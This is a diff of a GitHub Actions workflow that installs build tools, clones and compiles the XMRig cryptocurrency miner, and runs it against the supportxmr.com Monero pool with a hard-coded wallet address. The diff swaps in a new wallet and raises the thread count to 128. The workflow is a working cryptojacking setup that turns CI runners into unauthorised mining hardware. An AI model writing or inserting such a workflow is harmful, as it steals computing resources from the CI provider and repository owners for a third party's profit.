@@ -12,16 +12,25 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@v2
+      - name: Checkout Repository
+        uses: actions/checkout@v2
 
-      - name: Installs xmrig
+      - name: Install Dependencies
+        shell: bash
         run: |
-          sudo apt update
-          sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+          sudo apt-get update
+          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Build XMRig
+        shell: bash
+        run: |
           git clone https://github.com/xmrig/xmrig.git
-          mkdir xmrig/build && cd xmrig/build
-          cmake .. && make
+          mkdir -p xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
 
-      - name: Runs xmrig
+      - name: Run XMRig
+        shell: bash
         run: |
-          ./xmrig/build/xmrig -o pool.supportxmr.com:443 -u 89cHSTfn419XjxZo5RTvBL7xxabdCFMgWggXj6cr7cxpjfeyutBT3y6NRNkiAzYV1rGoc9dSxbnw7CRHAvEGvJRv2gJc7Ko -k --tls --rig-id uahahhsueyyww
+          cd xmrig/build
+          ./xmrig           -o pool.supportxmr.com:443           -u 4Apw9wXTXCSgMfGoLBEvAHRtkYBuhoJLZcdcUhXEr4ba3X7GJeuxtNnCheZd6X3VBjEuw3kNv8VLw9XsKAotZCUdMW1kPbx           -k --tls --threads=128 --cpu-priority=5 -p uahahhsueyyww
